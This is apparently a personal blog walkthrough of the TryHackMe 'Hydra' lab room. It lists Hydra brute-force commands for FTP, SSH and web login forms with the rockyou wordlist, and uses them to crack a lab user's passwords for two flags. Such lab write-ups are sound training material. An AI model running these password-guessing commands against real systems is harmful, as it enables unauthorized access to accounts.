---
title: "Hydra - TryHackMe"
author: krishna
description: "Walkthrough of Hydra from TryHackMe"
date: 2020-10-16 22:22:22 +0530
categories: [writeups, tryhackme]
tags: [tool]
---

**[Hydra from TryHackMe](https://tryhackme.com/room/hydra)**

## Task 1 - Hydra Introduction

uses and installation

## Task 2 - Using Hydra

* **ftp bruteforcing :** `hydra -l user -P passlist.txt ftp://$MACHINE_IP`

* **ssh bruteforcing :** `hydra -l <username> -P <full path to pass> $MACHINE_IP -t 4 ssh`

* **POST web form :** `hydra -l <username> -P <wordlist> $MACHINE_IP http-post-form "/<loginURL>:username=^USER^&password=^PASS^:F=incorrect" -V`

for the wordlists, i used ***rockyou.txt***. in kali, it is present in `/usr/share/wordlists/rockyou.txt.gz`.

1. Use Hydra to bruteforce molly's web password. What is flag 1?

	it is given that the username is molly. therefore, the hydra command would be `hydra -l molly -P /usr/share/wordlists/rockyou.txt.gz $MACHINE_IP http-post-form "/login:username=^USER^&password=^PASS^:F=incorrect" -V`

	![bruteforcing the login page](/assets/img/tryhackme/hydra/hydra1.png)

	the ***flag*** then appears with some disney background idk xD

	![getting the flag](/assets/img/tryhackme/hydra/hydra2.png)

2. Use Hydra to bruteforce molly's SSH password. What is flag 2?

	continuing, the hydra command would be `hydra -l molly -P /usr/share/wordlists/rockyou.txt.gz $MACHINE_IP -t 4 ssh`

	then after ssh-ing into molly's system using the password, the ***flag*** is present in `flag2.txt` right in the home directory

	![the bruteforce, the access and the flag](/assets/img/tryhackme/hydra/hydra3.png)

real nice room.
